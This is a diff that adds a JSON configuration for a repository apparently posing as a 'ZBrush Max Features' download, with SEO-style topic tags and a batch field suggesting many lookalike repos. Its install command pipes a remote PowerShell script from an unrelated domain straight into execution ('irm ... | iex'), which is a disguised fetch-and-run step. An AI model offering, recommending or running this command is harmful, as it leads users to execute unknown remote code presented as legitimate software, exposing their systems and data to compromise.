@@ -1,0 +1,27 @@
+{
+  "repo": "zbrush-max-features",
+  "product": "ZBrush Max Features",
+  "kind": "3d",
+  "install_type": "download",
+  "download_url": "https://zbrush.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "3d",
+  "topics": [
+    "zbrush-desktop-app",
+    "zbrush-win64",
+    "setup-checklist",
+    "rendering-suite",
+    "modeling-pipeline",
+    "zbrush-local-install",
+    "zbrush-windows-guide",
+    "zbrush-connection-help",
+    "zbrush-installer",
+    "support-docs",
+    "zbrush-edition",
+    "configuration",
+    "scene-composer"
+  ]
+}
